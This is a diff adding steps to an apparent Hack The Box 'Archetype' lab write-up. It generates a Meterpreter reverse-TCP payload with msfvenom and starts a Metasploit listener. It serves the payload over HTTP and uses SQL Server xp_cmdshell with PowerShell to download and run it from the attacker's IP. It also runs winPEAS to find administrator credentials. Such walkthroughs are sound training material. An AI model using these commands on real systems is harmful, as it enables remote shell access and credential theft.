@@ -75,7 +75,68 @@ We can try **msfvenom** tool to generate the payload for the reverse shell.
 
 ![image](https://user-images.githubusercontent.com/99097743/169732063-60f5b6b4-3640-4197-92d5-8c265a02d9c7.png)
 
+This command is important. It shows all framework payloads
 ```sh
 msfvenom -l payloads 
 ```
+
+The command to generate the payload
+```sh
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.26 -f exe -o payload.exe
+# Next Open Metasploit Framework
+msfconsole
+use exploit/multi/handler
+show options
+set payload windows/meterpreter/reverse_tcp
+run
+# Now our listener is active to connect to our localhost machine with VPN IP
+```
+![image](https://user-images.githubusercontent.com/99097743/169736888-315fe72f-fcd1-4e3f-af66-e5839c9659ed.png)
+
+Now we need to transfer the payload (payload.exe) to the target machine
+
+```sh
+sudo python3 -m http.server 80
+```
+
+Now we go back to SQL server. 
+Try to find directory with write and execute permissions 
+
+```sh
+xp_cmdshell "powershell -c cd C:/Users/Public"
+# Now transfer the file
+xp_cmdshell "powershell -c cd C:/Users/Public; wget http://10.10.16.26/payload.exe -o payload.exe"
+# Make sure it's is downloaded
+xp_cmdshell "powershell -c cd C:/Users/Public; dir"
+# Let's execute the payload
+xp_cmdshell "powershell -c cd C:/Users/Public; ./payload.exe"
+```
+
+Good job! meterpreter shell is activated:
+
+![image](https://user-images.githubusercontent.com/99097743/169738799-2cc02f1e-e5d5-4b89-91a9-37b2860fb99f.png)
+
+```sh
+getuid
+#user info
+```
+
+```sh
+upload winPEASx64.exe
+# IMPORTANT: For the Meterpreter shell, the local working directory is the location where one started the Metasploit console.
+# In this case: $upload winPEASx64.exe: takes the file from /home/kali/htb/archetype to the target machine
+```
+
+We can now run winPEAS
+```sh
+shell
+winPEASx64.exe
+```
+![Screenshot 2022-05-22 231416](https://user-images.githubusercontent.com/99097743/169742009-1a9d012b-6648-44d7-8603-a9be8d8aa013.png)
+
+Now we have access to Administrator username:password! 
+
+We can use evil-winrm 
+https://www.kali.org/tools/evil-winrm/
+
 
